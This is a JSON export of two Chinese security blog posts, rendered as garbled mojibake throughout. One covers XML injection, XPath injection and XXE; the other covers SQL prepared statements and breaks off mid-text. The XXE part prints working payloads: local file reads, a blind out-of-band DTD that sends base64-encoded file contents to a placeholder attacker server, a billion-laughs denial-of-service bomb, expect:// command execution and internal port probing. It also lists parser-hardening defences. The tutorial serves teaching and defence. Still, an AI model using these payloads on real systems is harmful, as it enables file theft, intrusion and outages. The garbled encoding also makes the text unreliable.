[{"title":"ä»XMLåˆ°XXE","path":"/2025/08/29/ä»XMLåˆ°XXE/","content":"ä»XMLåˆ°XXE XML ä»€ä¹ˆæ˜¯XMLï¼Ÿ XMLæŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ XMLçš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ® XMLä¸ä¼šåšä»»ä½•äº‹æƒ…ï¼ŒXMLè¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ XMLè¯­è¨€æ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ XML ä¸æ˜¯ HTML çš„æ›¿ä»£ XMLè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ HTMLæ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæ—¨åœ¨ä¼ è¾“ä¿¡æ¯ XMLè¯­æ³•ç»“æ„ è¯­æ³• XMLå…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ XMLæ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ XMLå¿…é¡»æ­£ç¡®åœ°åµŒå¥— XMLæ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´  XMLçš„å±æ€§å€¼é¡»åŠ å¼•å· ç»“æ„ XMLæ–‡æ¡£å£°æ˜ï¼Œåœ¨æ–‡æ¡£çš„ç¬¬ä¸€è¡Œ XMLæ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDï¼ŒXXE æ¼æ´æ‰€åœ¨çš„åœ°æ–¹ XMLæ–‡æ¡£å…ƒç´  DTD XMLæ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æ§åˆ¶çš„ DTDç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨å¦å¤–ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨) DTDæ–‡æ¡£ 1.å†…éƒ¨DTDæ–‡æ¡£!DOCTYPE æ ¹å…ƒç´ [å®šä¹‰å†…å®¹]2.å¤–éƒ¨DTDæ–‡æ¡£!DOCTYPE æ ¹å…ƒç´  SYSTEM DTDæ–‡ä»¶è·¯å¾„3.å†…å¤–éƒ¨DTDæ–‡æ¡£ç»“åˆ!DOCTYPE æ ¹å…ƒç´  SYSTEM DTDæ–‡ä»¶è·¯å¾„ [å®šä¹‰å†…å®¹] å®ä½“å¼•ç”¨ XMLå…ƒç´ ä»¥å½¢å¦‚ tagfoo/tag çš„æ ‡ç­¾å¼€å§‹å’Œç»“æŸï¼Œå¦‚æœå…ƒç´ å†…éƒ¨å‡ºç°å¦‚ çš„ç‰¹æ®Šå­—ç¬¦ï¼Œè§£æå°±ä¼šå¤±è´¥ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼ŒXMLç”¨å®ä½“å¼•ç”¨ï¼ˆentity referenceï¼‰æ›¿æ¢ç‰¹æ®Šå­—ç¬¦ã€‚XMLé¢„å®šä¹‰äº”ä¸ªå®ä½“å¼•ç”¨ï¼š lt; å°äºå·gt: å¤§äºå·amp; å’Œapos; å•å¼•å·quot; åŒå¼•å· DTDå®ä½“ å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ å†…éƒ¨å®ä½“ !ENTITY å®ä½“åç§° å®ä½“çš„å€¼ä¾‹å¦‚ï¼š!DOCTYPE foo [ !ELEMENT foo ANY !ENTITY xxe hello]fooxxe;/foo å¤–éƒ¨å®ä½“ æœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºï¼Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯ä»¥åˆ©ç”¨å¦‚ä¸‹åè®®file://æ–‡ä»¶ç»å¯¹è·¯å¾„ å¦‚ï¼šfile:///etc/passwdhttp://url/file.extphp://filter/read=convert.base64-encode/resource=xxx.phpä¾‹å¦‚:!DOCTYPE foo [ !ELEMENT foo ANY !ENTITY % xxe SYSTEM http://xxx.xxx.xxx/evil.dtd %xxe;]fooevil;/fooå¤–éƒ¨evil.dtdä¸­çš„å†…å®¹!ENTITY evil SYSTEM â€œfile:///etc/passwdâ€ %xxeæ‰§è¡Œåä¼šåŠ è½½å¤–éƒ¨å®ä½“ evil.dtd å¹¶æ‰§è¡Œï¼Œå¾—åˆ°çš„ç»“æœä¼šæ”¾åœ¨ä¸­ XMLæ³¨å…¥ ä»€ä¹ˆæ˜¯XMLæ³¨å…¥ï¼Ÿ XMLæ³¨å…¥æ”»å‡»å’ŒSQLæ³¨å…¥æ”»å‡»çš„åŸç†ç±»ä¼¼ï¼Œåˆ©ç”¨äº†XMLè§£ææœºåˆ¶çš„æ¼æ´ï¼Œå¦‚æœç³»ç»Ÿå¯¹ç”¨æˆ·è¾“å…¥,æ²¡æœ‰åšè½¬ä¹‰çš„å¤„ç†ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹XMLçš„æ•°æ®æ ¼å¼ï¼Œæˆ–è€…æ·»åŠ æ–°çš„XMLèŠ‚ç‚¹ï¼Œå°±ä¼šå¯¼è‡´è§£æXMLå¼‚å¸¸ï¼Œå¯¼è‡´XMLæ³¨å…¥æ”»å‡» å¦‚ä½•æ³¨å…¥ï¼Ÿ å¦‚ä¸‹XMLæ˜¯ç”¨äºæ³¨å†Œè®¿é—®ç”¨æˆ·ï¼Œå…¶ä¸­ç”¨æˆ·åæ˜¯ç”±ç”¨æˆ·è‡ªå·±è¾“å…¥çš„ ?xml version=1.0 encoding=UTF-8 ?user role=guestç”¨æˆ·è¾“å…¥/user æ”»å‡»è€…åœ¨è¾“å…¥ç”¨æˆ·çš„æ—¶å€™ï¼Œå¯ä»¥æ„é€  user1 /user user role=â€œadminâ€user2æ•°æ®å»æ‹¼æ¥XMLï¼Œä¹‹åæ•´ä¸ªXMLå­—ç¬¦ä¸²å°†ä¼šå˜æˆå¦‚ä¸‹æ ¼å¼ã€‚è¿™æ ·å°±æ·»åŠ äº†ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ç”¨æˆ· ?xml version=1.0 encoding=UTF-8 ?user role=guestuser1/useruser role=adminuser2/user å¦‚ä½•é˜²å¾¡ï¼Ÿ ä½¿ç”¨å®‰å…¨çš„XMLåº“ æ­£ç¡®ä»£ç ä½¿ç”¨Dom4jæ¥æ„å»ºXMLï¼ŒDom4jå°†ä¼šå¯¹æ–‡æœ¬æ•°æ®è¿›è¡ŒXMLç¼–ç ï¼Œä»è€Œä½¿å¾—XMLçš„åŸå§‹ç»“æ„å’Œæ ¼å¼å…å—ç ´åï¼Œé˜²æ­¢äº†XMLæ³¨å…¥ å¯¹ç”¨æˆ·è¾“å…¥çš„å­—æ®µè¿›è¡Œè½¬ç å¤„ç† ä½¿ç”¨å®ä½“ç¼–ç å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè½¬ä¹‰ XPathæ³¨å…¥ ä»€ä¹ˆæ˜¯XPathæ³¨å…¥ï¼Ÿ XPathæ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨XPath è§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ XPathæ³¨å…¥å‘ç”Ÿåœ¨å½“ç«™ç‚¹ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ¥æ„é€ è¯·æ±‚ä»¥è·å–XMLæ•°æ®ã€‚æ”»å‡»è€…å¯¹ç«™ç‚¹å‘é€ç»è¿‡ç‰¹æ®Šæ„é€ çš„ä¿¡æ¯æ¥æ¢ç©¶ç«™ç‚¹ä½¿ç”¨çš„XMLæ˜¯å¦‚ä½•æ„é€ çš„ï¼Œä»è€Œè¿›ä¸€æ­¥è·å–æ­£å¸¸é€”å¾„ä¸‹æ— æ³•è·å–çš„æ•°æ®ã€‚å½“XMLæ•°æ®è¢«ç”¨ä½œè´¦æˆ·éªŒè¯æ—¶ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æå‡ä»–çš„æƒé™ å¦‚ä½•æ³¨å…¥ï¼Ÿ XPathæ³¨å…¥æ”»å‡»ä¸»è¦æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥å¾€å¾€æ˜¯XPathè¯­æ³•ä¸­çš„ä¸€äº›ç»„åˆï¼Œè¿™äº›è¾“å…¥å°†ä½œä¸ºå‚æ•°ä¼ å…¥Web åº”ç”¨ç¨‹åºï¼Œé€šè¿‡æ‰§è¡ŒXPathæŸ¥è¯¢è€Œæ‰§è¡Œå…¥ä¾µè€…æƒ³è¦çš„æ“ä½œ æ³¨å…¥å¯¹è±¡ä¸æ˜¯æ•°æ®åº“usersè¡¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå­˜å‚¨æ•°æ®çš„XMLæ–‡ä»¶ã€‚å› ä¸ºxpathä¸å­˜åœ¨è®¿é—®æ§åˆ¶ï¼Œæ‰€ä»¥ä¸ä¼šé‡åˆ°è®¸å¤šåœ¨SQLæ³¨å…¥ä¸­ç»å¸¸é‡åˆ°çš„è®¿é—®é™åˆ¶ã€‚ æ³¨å…¥å‡ºç°çš„ä½ç½®ä¹Ÿå°±æ˜¯cookieï¼Œheadersï¼Œrequest parameters/inputç­‰ å¦‚æœä¸€ä¸ªç½‘ç«™æŸåº”ç”¨ç¨‹åºå°†æ•°æ®ä¿å­˜åœ¨XMLä¸­ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…æäº¤äº†æ²¡æœ‰ç»è¿‡å¤„ç†çš„è¾“å…¥ï¼Œå°±æ’å…¥åˆ° XPath æŸ¥è¯¢ä¸­ï¼Œå³äº§ç”ŸXpathæ³¨å…¥ï¼Œé‚£ä¹ˆå°±æ”»å‡»è€…å°±å¯èƒ½é€šè¿‡æ§åˆ¶æŸ¥è¯¢ï¼Œè·å–æ•°æ®ï¼Œæˆ–è€…åˆ é™¤æ•°æ®ä¹‹ç±»çš„æ“ä½œ Xpathæ˜¯xmlè·¯å¾„è¯­è¨€ï¼Œç”¨äºé…ç½®æ–‡ä»¶çš„æŸ¥æ‰¾ã€‚æ•°æ®åº“å°±æ˜¯xmlæ–‡ä»¶ã€‚å› æ­¤åªè¦æ˜¯åˆ©ç”¨XPathè¯­æ³•çš„Web åº”ç”¨ç¨‹åºå¦‚æœæœªå¯¹è¾“å…¥çš„XPathæŸ¥è¯¢åšä¸¥æ ¼çš„å¤„ç†éƒ½ä¼šå­˜åœ¨XPathæ³¨å…¥æ¼æ´ã€‚æ¯”å¦‚ä¸€äº›ç™»å½•åœ°å€é¡µé¢ï¼Œæœç´¢é¡µé¢éœ€è¦ä¸xmläº¤äº’çš„ä½ç½® Xpathç›´æ¥æ³¨å…¥ ç¤ºä¾‹ï¼š test.xml(å­˜å‚¨ç”¨æˆ·åå’Œå¯†ç ) ?xml version=1.0 encoding=UTF-8?root users user id1/id usernametest1/username passwordtest1/password /user user id2/id usernametest2/username passwordtest2/password /user /users/root php(ç”¨äºæ¥æ”¶ä¼ å…¥å‚æ•°ï¼Œå¹¶è¿›è¡ŒXMLæŸ¥è¯¢) ?php$xml=simplexml_load_file(test.xml);$name=$_GET[name];$pwd=$_GET[pwd];$query=/root/users/user[username/text()=.$name. and password/text()=.$pwd.];echo $query;$result=$xml-xpath($query);if($result) echo h2Welcome/h2; foreach($result as $key=$value) echo br /ID:.$value-id; echo br /Username:.$value-username; ? ä½¿ç”¨simplexml_load_file()å‡½æ•°è¿”å›ç±» SimpleXMLElement çš„ä¸€ä¸ªå¯¹è±¡ï¼ˆè¯¥å¯¹è±¡çš„å±æ€§åŒ…å« XML æ–‡æ¡£ä¸­çš„æ•°æ®ï¼‰ æ”»å‡»è€…åœ¨usernameå­—æ®µä¸­æ„é€ æ’çœŸè¯­å¥å¦‚' or 1=1 or ''='è¿›è¡Œé—­åˆï¼Œè·å–æ‰€æœ‰useræ•°æ® Xpathç›²æ³¨ å¦‚æœéå†å‡ºæ•´ä¸ªXMLæ–‡æ¡£ï¼Œä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š 1.ç›²æ³¨æ ¹èŠ‚ç‚¹ åˆ©ç”¨countï¼ˆ/*ï¼‰åˆ¤æ–­æ ¹ä¸‹èŠ‚ç‚¹ï¼š ?name= or count(/*) = 1 or 1 = 2 æœ‰è¿”å›ç»“æœè¯æ˜å­˜åœ¨ä¸€ä¸ªæ ¹èŠ‚ç‚¹ åˆ©ç”¨substringåˆ†å‰²æ ¹èŠ‚ç‚¹çš„æ¯ä¸ªå­—ç¬¦ï¼ŒçŒœè§£ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼š ?name= or substring(name(/*[position() = 1]),1,1)=r or 1=2?name= or substring(name(/*[position() = 1]),2,1)=o or 1=2 2.ç›²æ³¨rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹ åˆ¤æ–­rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹æ•°ï¼š ?name= or count(/root/*) = 1 or 1 = 2 æœ‰è¿”å›ç»“æœè¯æ˜å­˜åœ¨ä¸€ä¸ªrootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹ çŒœè§£rootçš„ä¸‹ä¸€çº§èŠ‚ç‚¹ï¼š ?name= or substring(name(/root/*[position() = 1]),1,1)=u or 1=2?name= or substring(name(/root/*[position() = 1]),2,1)=s or 1=2 é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´è‡³çŒœè§£å‡ºæ‰€æœ‰èŠ‚ç‚¹ï¼Œæœ€åæ¥çŒœè§£èŠ‚ç‚¹ä¸­çš„æ•°æ®æˆ–å±æ€§å€¼ å¦‚ä½•é˜²å¾¡ï¼Ÿ é™åˆ¶æäº¤éæ³•å­—ç¬¦ï¼Œå¯¹è¾“å…¥å†…å®¹ä¸¥æ ¼æ£€æŸ¥è¿‡æ»¤ï¼Œå‚æ•°åŒ–XPathæŸ¥è¯¢çš„å˜é‡ XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXXEï¼‰ ä»€ä¹ˆæ˜¯XXEï¼Ÿ XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ å¦‚ä½•æ³¨å…¥ï¼Ÿ ä¸SQLç›¸ä¼¼ï¼ŒXXEæ¼æ´ä¹Ÿåˆ†ä¸ºæœ‰å›æ˜¾å’Œæ— å›æ˜¾ æœ‰å›æ˜¾ï¼Œå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ æ— å›æ˜¾ï¼Œåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®(OOB)é€šé“æå–æ•°æ®ã€‚å³å¯ä»¥å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„XMLæ–‡ä»¶è¯»å–æ–‡ä»¶ è¯»å–ä»»æ„æ–‡ä»¶ æœ‰å›æ˜¾ é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæœ‰XXEæ¼æ´çš„æ–‡ä»¶ï¼Œè¿™é‡Œä»¥phpæ–‡ä»¶ä¸ºä¾‹ ç¤ºä¾‹ä»£ç ï¼š ?php$xml=simplexml_load_string($_GET[xml]);print_r((string)$xml);//æœ‰å›æ˜¾? payload: ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY file SYSTEM file:///D://1.txt ]rootnamefile;/name/root è¯»å–æ–‡ä»¶ï¼Œéœ€URLç¼–ç åæ‰§è¡Œ é€šè¿‡æ„é€ å¤–éƒ¨å®ä½“payloadï¼Œåœ¨ xml ä¸­ file ; å˜æˆäº†å¤–éƒ¨æ–‡ä»¶1.txtä¸­å†…å®¹ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ² æ— å›æ˜¾ æ— å›æ˜¾çš„æ–‡ä»¶è¯»å–å¯ä»¥é€šè¿‡ blind XXE æ–¹æ³•åŠ ä¸Šå¤–å¸¦æ•°æ®é€šé“ï¼ˆooBï¼‰æ¥æå–æ•°æ®ï¼Œå…ˆä½¿ç”¨php://filteråè®®è·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ”»å‡»æœåŠ¡å™¨æ¥è¯»å–æ•°æ®ã€‚è™½æ— æ³•ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†ï¼Œåœ¨å¤–éƒ¨ç½‘ç»œä¸Šæ‰§è¡Œæ‰«æä»¥åŠä»£ç ã€‚å³ï¼Œå½“æ— å›æ˜¾æƒ…å†µæ—¶ï¼Œå¯ä»¥å°†æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨) paylaodï¼š ?xml version=1.0?!DOCTYPE test[!ENTITY % file SYSTEM php://filter/read=convert.base64-encode/resource=D:/1.txt!ENTITY % dtd SYSTEM http://xxx.xxx.xxx.xxx/evil.dtd%dtd;%send;] evil.dtdï¼š !ENTITY % payload !ENTITY #x25; send SYSTEM http://xxx.xxx.xxx.xxx/?content=%file; %payload;//%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ#x25 è¿›è¡ŒXXEæ”»å‡»åï¼ŒæœåŠ¡å™¨ä¼šæŠŠæ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨(è¿™é‡Œæ˜¯ubantuçš„apacheæ—¥å¿—è®°å½•) ubantuæŸ¥çœ‹apacheæ—¥å¿—è®°å½•å‘½ä»¤ï¼š tail -f /var/log/apache2/access.log æœ¬åœ°æŠ“åŒ…ä¹Ÿå¯ä»¥çœ‹åˆ°Base64ç¼–ç åçš„æ–‡ä»¶å†…å®¹ æ‹’ç»æœåŠ¡æ”»å‡»(Dos) å¸¸è§çš„XMLç‚¸å¼¹ï¼šå½“XMLè§£æå™¨å°è¯•è§£æè¯¥æ–‡ä»¶æ—¶ï¼Œç”±äºDTDçš„å®šä¹‰æŒ‡æ•°çº§å±•å¼€ï¼Œè¿™ä¸ª1Kä¸åˆ°çš„æ–‡ä»¶ä¼šå ç”¨åˆ°3Gçš„å†…å­˜ ?xml version=1.0? !DOCTYPE lolz [!ENTITY lol lol!ENTITY lol2 lol;lol;lol;lol;lol;lol;lol;lol;lol;lol;!ENTITY lol3 lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;!ENTITY lol4 lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;!ENTITY lol5 lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;!ENTITY lol6 lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;!ENTITY lol7 lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;!ENTITY lol8 lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;!ENTITY lol9 lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;]lolzlol9;/lolz åŸç†ï¼šé€’å½’å¼•ç”¨,lol å®ä½“å…·ä½“è¿˜æœ‰ â€œlolâ€ å­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ª lol2 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol å®ä½“ï¼Œä¸€ä¸ª lol3 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol2 å®ä½“ï¼Œæ­¤æ—¶ä¸€ä¸ª lol3 å®ä½“å°±å«æœ‰ 10^2 ä¸ª â€œlolâ€ äº†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œlol9 å®ä½“å«æœ‰ 10^8 ä¸ª â€œlolâ€ å­—ç¬¦ä¸²,æœ€åå†å¼•ç”¨lol9 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ åœ¨phpç¯å¢ƒä¸‹ï¼Œxmlå‘½ä»¤æ‰§è¡Œéœ€è¦phpè£…æœ‰expectæ‰©å±•ï¼Œä½†è¯¥æ‰©å±•é»˜è®¤æ²¡æœ‰å®‰è£…ï¼Œæ‰€ä»¥ä¸€èˆ¬æ¥è¯´å‘½ä»¤æ‰§è¡Œæ˜¯æ¯”è¾ƒéš¾åˆ©ç”¨ï¼Œä½†ä¸æ’é™¤ ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY xxe SYSTEM expect://id ]rootnamexxe;/name/root æ¢æµ‹å†…ç½‘ç«¯å£ ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY xxe SYSTEM http://127.0.0.1:80 ]rootnamexxe;/name/root å¦‚ä½•é˜²å¾¡ï¼Ÿ ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• php: libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python: from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ® è¿‡æ»¤å…³é”®å­—ï¼š\\!DOCTYPEå’Œ\\!ENTITYï¼Œæˆ–è€…SYSTEMå’ŒPUBLIC ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD å‚è€ƒï¼š ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ XXEæ¼æ´è¯¦è§£ XMLæ³¨å…¥æ”»å‡»æ€»ç»“","tags":["æ¼æ´","XMLæ¼æ´"],"categories":["æ¼æ´"]},{"title":"é¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å—ï¼Ÿï¼Ÿï¼Ÿ","path":"/2025/08/24/SQLé¢„ç¼–è¯‘/","content":"SQLé¢„ç¼–è¯‘ æœ¬æ–‡ç« ä¸»è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼š é¢„ç¼–è¯‘çœŸçš„èƒ½å®Œç¾é˜²å¾¡SQLæ³¨å…¥å—ï¼Ÿï¼Ÿï¼Ÿ sqlæ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…æ‹¼æ¥æ¶æ„SQLè¯­å¥åˆ°æ¥å—å¤–éƒ¨å‚æ•°çš„åŠ¨æ€SQLæŸ¥è¯¢ä¸­ï¼Œç¨‹åºæœ¬èº«æœªå¯¹æ’å…¥çš„SQLè¯­å¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´SQLè¯­å¥ç›´æ¥è¢«æœåŠ¡ç«¯æ‰§è¡Œ å¯¹äºå¦‚æ­¤å±é™©çš„æ¼æ´ï¼Œæœ‰æ²¡æœ‰åŠæ³•è¿›è¡Œé˜»æ­¢å‘¢ï¼Ÿ æœ‰çš„å…„å¼Ÿï¼Œæœ‰çš„ï¼ é¢„ç¼–è¯‘å°±èƒ½è§£å†³å¤§éƒ¨åˆ†çš„SQLæ³¨å…¥é—®é¢˜ ä½•ä¸ºé¢„ç¼–è¯‘ï¼Ÿ é¢„ç¼–è¯‘å…¨ç§°Prepared Statementï¼Œå°±æ˜¯åœ¨æ‰§è¡ŒSQLå‰ï¼ŒæŠŠSQLè¯­å¥å‘Šè¯‰æ•°æ®åº“æœåŠ¡å™¨ï¼Œç¼–è¯‘å¥½ç»“æ„ï¼Œç„¶åå†å•ç‹¬ä¼ å‚æ•°è¿›å»æ‰§è¡Œ æ™®é€šçš„æ‹¼æ¥SQLï¼š username = input(è¯·è¾“å…¥ç”¨æˆ·åï¼š)sql = SELECT * FROM users WHERE username = + username + cursor.execute(sql) è¿™å°±å¥½åƒç›´æ¥æŠŠâ€œç”¨æˆ·è¾“å…¥â€å’Œâ€œSQLè¯­å¥â€æ‹¼æˆä¸€æ•´å¥è¯ã€‚ ç”¨æˆ·åªè¦è¾“å…¥äº†å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå°±èƒ½æ§åˆ¶æ•´ä¸ª SQL çš„é€»è¾‘ï¼ ä½¿ç”¨é¢„ç¼–è¯‘ï¼š username = input(è¯·è¾“å…¥ç”¨æˆ·åï¼š)sql = SELECT * FROM users WHERE username = ?cursor.execute(sql, (username,)) SQL å†™çš„æ—¶å€™ï¼Œç”¨å ä½ç¬¦ï¼ˆ?ï¼‰æˆ–å‘½åå‚æ•°ï¼ˆ:nameï¼‰ï¼Œ å‚æ•°æ˜¯åé¢ä¼ è¿›å»çš„ï¼ä¸æ˜¯æ‹¼è¿›å»çš„ï¼ é¢„ç¼–è¯‘çš„æ‰§è¡Œæµç¨‹ å‘é€ SQL æ¨¡æ¿ç»™æ•°æ®åº“æœåŠ¡å™¨ æ¯”å¦‚ï¼š SELECT * FROM users WHERE username = ? è¿™ä¸ªæ—¶å€™æ•°æ®åº“å°±æŠŠè¿™ä¸ª SQL çš„ç»“æ„ç¼–è¯‘å¥½äº†ï¼Œç”Ÿæˆäº†â€œæ‰§è¡Œè®¡åˆ’â€ æœåŠ¡å™¨æŠŠè¿™ä¸ªè¯­å¥å­˜èµ·æ¥ å­˜çš„æ˜¯â€œåªå·®å‚æ•°â€çš„ SQL æ¨¡æ¿ å®¢æˆ·ç«¯å‘é€å‚æ•° æ¯”å¦‚ï¼š (admin,) æ•°æ®åº“æ‰§è¡Œä¹‹å‰ç¼–è¯‘å¥½çš„ SQL æŠŠä½ ä¼ è¿›å»çš„å‚æ•°å½“æˆâ€œçº¯æ•°æ®â€ï¼Œç›´æ¥æ”¾è¿›è¯­å¥æ‰§è¡Œï¼ ä¸ºä»€ä¹ˆè¿™æ ·èƒ½é˜²æ­¢ SQL æ³¨å…¥ï¼Ÿ å› ä¸ºå‚æ•°æ°¸è¿œåªæ˜¯å€¼ï¼Œä¸ä¼šè¢«å½“ä½œ SQL ä»£ç æ‰§è¡Œï¼ å“ªæ€•ç”¨æˆ·è¾“å…¥çš„æ˜¯ï¼š OR 1=1 æ•°æ®åº“ä¹Ÿä¼šå½“æˆä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸² ' OR '1'='1 æ¥å¤„ç†ï¼Œå®ƒä¸ä¼šè®©å®ƒæ”¹å˜ SQL è¯­å¥çš„é€»è¾‘ç»“æ„ 